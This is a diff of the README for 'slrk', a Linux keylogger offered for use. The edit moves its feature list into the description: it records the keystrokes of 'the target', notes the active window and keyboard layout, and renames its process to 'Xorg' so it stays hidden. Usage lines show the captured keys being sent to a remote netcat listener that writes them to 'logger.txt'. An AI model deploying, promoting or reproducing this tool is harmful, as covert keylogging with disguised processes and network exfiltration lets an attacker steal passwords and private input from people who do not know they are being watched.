@@ -2,8 +2,12 @@
 
 DESCRIPTION:<br>
 
-Simple keylogger that runs on Linux.<br>
-It must be run as root.
+Simple keylogger that runs on Linux.
+<br>It shows the active window on which the target is writing.
+<br>Keys are mapped on English keyboard.
+<br>It shows the keyboard layout (e.g.: us, it, colemak, etc..).
+<br>Process name is renamed as "Xorg".
+<br>It must be run as root.
 
 __________________________________________________________________________
 Usage: #./slrk [OPTIONS]<br>
@@ -25,7 +29,4 @@ Client#./slrk -m remote -a 127.0.0.1 -p 8888<br><br>
 Server$ nc -6 -lvp 8888 > logger.txt<br>
 Client#./slrk -m remote -a ::1 -p 8888
 __________________________________________________________________________
-<br>(It shows the active window on which the target is writing)
-<br>(Keys are mapped on English keyboard)
-<br>(It shows the keyboard layout (e.g.: us, it, colemak, etc..))  
-(Process name is renamed as "Xorg")
+
